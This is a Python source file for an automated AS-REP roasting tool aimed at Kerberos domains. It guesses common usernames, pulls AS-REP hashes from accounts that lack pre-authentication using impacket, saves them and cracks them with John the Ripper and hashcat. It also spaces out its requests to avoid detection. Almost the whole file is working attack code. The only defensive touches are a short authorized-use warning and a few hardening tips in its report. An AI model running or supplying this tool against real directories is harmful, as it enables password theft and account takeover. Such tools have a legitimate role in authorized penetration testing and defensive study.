#!/usr/bin/env python3
"""
Automated AS-REP Roasting Tool
Features:
- Automatic user enumeration
- Multiple hash format outputs
- Automatic hash cracking
- Results correlation
- Detection evasion with timing controls
"""

import subprocess
import argparse
import json
import time
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional
import hashlib
from colorama import Fore, Style, init

init(autoreset=True)


class ASREPRoaster:
    def __init__(
        self,
        realm: str,
        kdc: str,
        userlist: str = None,
        output_dir: str = "asrep_results",
        delay: float = 2.0,
        crack: bool = False,
        wordlist: str = None
    ):
        self.realm = realm.upper()
        self.kdc = kdc
        self.userlist = userlist
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.delay = delay
        self.crack = crack
        self.wordlist = wordlist

        self.roastable_users = []
        self.hashes = {}
        self.cracked = {}

    def enumerate_users(self) -> List[str]:
        """Enumerate potential usernames"""
        if self.userlist and Path(self.userlist).exists():
            with open(self.userlist) as f:
                users = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(users)} users from {self.userlist}")
            return users

        # Default common usernames
        default_users = [
            'admin', 'administrator', 'user', 'guest', 'test',
            'service', 'backup', 'sqlservice', 'httpservice',
            'krbtgt', 'vagrant', 'dev', 'support'
        ]
        print(f"{Fore.YELLOW}[*] Using default username list ({len(default_users)} users)")
        return default_users

    def check_asrep_roastable(self, username: str) -> Optional[str]:
        """
        Check if user is AS-REP roastable
        Returns hash if roastable, None otherwise
        """
        print(f"{Fore.CYAN}[*] Checking {username}@{self.realm}...")

        try:
            # Using impacket's GetNPUsers
            result = subprocess.run(
                [
                    'impacket-GetNPUsers',
                    f'{self.realm}/{username}',
                    '-dc-ip', self.kdc,
                    '-no-pass',
                    '-format', 'hashcat'
                ],
                capture_output=True,
                timeout=15,
                text=True
            )

            output = result.stdout + result.stderr

            # Check for hash in output
            if '$krb5asrep$23$' in output:
                # Extract hash
                for line in output.split('\n'):
                    if '$krb5asrep$23$' in line:
                        hash_value = line.strip()
                        print(f"{Fore.GREEN}[+] ROASTABLE: {username}@{self.realm}")
                        print(f"{Fore.GREEN}    Hash: {hash_value[:80]}...")
                        return hash_value

            elif 'User doesn\'t have UF_DONT_REQUIRE_PREAUTH set' in output:
                print(f"{Fore.YELLOW}    {username} - Pre-auth required (secure)")
            elif 'KDC_ERR_C_PRINCIPAL_UNKNOWN' in output:
                print(f"{Fore.RED}    {username} - User doesn't exist")
            else:
                print(f"{Fore.YELLOW}    {username} - {output[:50]}")

            return None

        except subprocess.TimeoutExpired:
            print(f"{Fore.RED}[!] Timeout checking {username}")
            return None
        except FileNotFoundError:
            print(f"{Fore.RED}[!] impacket-GetNPUsers not found. Install impacket.")
            return None
        except Exception as e:
            print(f"{Fore.RED}[!] Error checking {username}: {e}")
            return None

    def save_hashes(self):
        """Save hashes to file for cracking"""
        if not self.hashes:
            return

        # Hashcat format
        hashcat_file = self.output_dir / f"asrep_hashes_hashcat_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(hashcat_file, 'w') as f:
            for username, hash_value in self.hashes.items():
                f.write(f"{hash_value}\n")

        print(f"{Fore.GREEN}[+] Hashes saved (Hashcat format): {hashcat_file}")

        # John format
        john_file = self.output_dir / f"asrep_hashes_john_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(john_file, 'w') as f:
            for username, hash_value in self.hashes.items():
                f.write(f"{hash_value}\n")

        print(f"{Fore.GREEN}[+] Hashes saved (John format): {john_file}")

        return hashcat_file, john_file

    def crack_hashes(self, hashfile: str):
        """Attempt to crack hashes"""
        if not self.wordlist:
            print(f"{Fore.YELLOW}[*] No wordlist provided, skipping cracking")
            return

        if not Path(self.wordlist).exists():
            print(f"{Fore.RED}[!] Wordlist not found: {self.wordlist}")
            return

        print(f"\n{Fore.CYAN}[*] Attempting to crack hashes...")
        print(f"{Fore.CYAN}[*] Wordlist: {self.wordlist}")
        print(f"{Fore.CYAN}[*] This may take a while...")

        # Try John the Ripper first
        try:
            print(f"{Fore.YELLOW}[*] Trying John the Ripper...")
            result = subprocess.run(
                ['john', '--wordlist=' + self.wordlist, str(hashfile)],
                capture_output=True,
                text=True,
                timeout=300  # 5 minutes max
            )

            # Show results
            show_result = subprocess.run(
                ['john', '--show', str(hashfile)],
                capture_output=True,
                text=True
            )

            if show_result.stdout:
                print(f"{Fore.GREEN}[+] Cracked passwords:")
                print(show_result.stdout)

                # Parse cracked passwords
                for line in show_result.stdout.split('\n'):
                    if ':' in line and '@' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            user_part = parts[0].split('$')[-1].split('@')[0]
                            password = parts[1]
                            self.cracked[user_part] = password

        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[*] John timeout - trying Hashcat...")
        except FileNotFoundError:
            print(f"{Fore.YELLOW}[*] John not found - trying Hashcat...")
        except Exception as e:
            print(f"{Fore.RED}[!] John error: {e}")

        # Try Hashcat
        try:
            print(f"{Fore.YELLOW}[*] Trying Hashcat...")
            result = subprocess.run(
                [
                    'hashcat',
                    '-m', '18200',  # AS-REP hash mode
                    '-a', '0',  # Dictionary attack
                    str(hashfile),
                    self.wordlist,
                    '--force'
                ],
                capture_output=True,
                text=True,
                timeout=300
            )

            # Show results
            show_result = subprocess.run(
                ['hashcat', '-m', '18200', str(hashfile), '--show'],
                capture_output=True,
                text=True
            )

            if show_result.stdout:
                print(f"{Fore.GREEN}[+] Hashcat cracked passwords:")
                print(show_result.stdout)

        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[*] Hashcat timeout")
        except FileNotFoundError:
            print(f"{Fore.YELLOW}[*] Hashcat not found")
        except Exception as e:
            print(f"{Fore.RED}[!] Hashcat error: {e}")

    def generate_report(self):
        """Generate detailed report"""
        report_file = self.output_dir / f"asrep_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        report = {
            'scan_info': {
                'realm': self.realm,
                'kdc': self.kdc,
                'timestamp': datetime.now().isoformat(),
                'users_tested': len(self.roastable_users) + len([u for u in self.hashes if u not in self.roastable_users])
            },
            'findings': {
                'roastable_users': self.roastable_users,
                'hashes_captured': len(self.hashes),
                'passwords_cracked': len(self.cracked)
            },
            'hashes': {user: hash_value[:80] + '...' for user, hash_value in self.hashes.items()},
            'cracked_passwords': self.cracked,
            'recommendations': [
                'Enable Kerberos pre-authentication for all users',
                'Review and disable unnecessary service accounts',
                'Implement strong password policies',
                'Monitor for AS-REQ without pre-auth data',
                'Consider using managed service accounts'
            ]
        }

        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n{Fore.GREEN}[+] Report saved: {report_file}")

    def run(self):
        """Run AS-REP roasting attack"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}AS-REP Roasting Attack")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Target Realm: {self.realm}")
        print(f"{Fore.CYAN}KDC: {self.kdc}")
        print(f"{Fore.CYAN}Delay: {self.delay}s")
        print(f"{Fore.CYAN}{'='*60}\n")

        # Enumerate users
        users = self.enumerate_users()

        # Check each user
        for username in users:
            hash_value = self.check_asrep_roastable(username)

            if hash_value:
                self.roastable_users.append(username)
                self.hashes[username] = hash_value

            time.sleep(self.delay)

        # Save results
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Results Summary")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"Users tested: {len(users)}")
        print(f"Roastable users found: {Fore.GREEN}{len(self.roastable_users)}")
        print(f"Hashes captured: {Fore.GREEN}{len(self.hashes)}")
        print(f"{Fore.CYAN}{'='*60}\n")

        if self.hashes:
            hashcat_file, john_file = self.save_hashes()

            # Crack if requested
            if self.crack:
                self.crack_hashes(hashcat_file)

        # Generate report
        self.generate_report()

        # Print roastable users
        if self.roastable_users:
            print(f"\n{Fore.RED}[!] VULNERABLE ACCOUNTS FOUND:")
            for user in self.roastable_users:
                status = f"(CRACKED: {self.cracked[user]})" if user in self.cracked else "(Not cracked)"
                print(f"{Fore.RED}    - {user}@{self.realm} {status}")


def main():
    parser = argparse.ArgumentParser(
        description="Automated AS-REP Roasting Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic AS-REP roasting
  python asrep_roast_automated.py -r LAB.LOCAL -k 192.168.88.20

  # With custom user list
  python asrep_roast_automated.py -r LAB.LOCAL -k 192.168.88.20 -u users.txt

  # With automatic cracking
  python asrep_roast_automated.py -r LAB.LOCAL -k 192.168.88.20 -u users.txt --crack -w passwords.txt

⚠️  Use only in authorized environments!
        """
    )

    parser.add_argument('-r', '--realm', required=True, help='Kerberos realm')
    parser.add_argument('-k', '--kdc', required=True, help='KDC IP address')
    parser.add_argument('-u', '--userlist', help='File containing usernames')
    parser.add_argument('-o', '--output-dir', default='asrep_results', help='Output directory')
    parser.add_argument('-d', '--delay', type=float, default=2.0, help='Delay between checks')
    parser.add_argument('--crack', action='store_true', help='Attempt to crack hashes')
    parser.add_argument('-w', '--wordlist', help='Wordlist for cracking')

    args = parser.parse_args()

    roaster = ASREPRoaster(
        realm=args.realm,
        kdc=args.kdc,
        userlist=args.userlist,
        output_dir=args.output_dir,
        delay=args.delay,
        crack=args.crack,
        wordlist=args.wordlist
    )

    roaster.run()


if __name__ == "__main__":
    main()
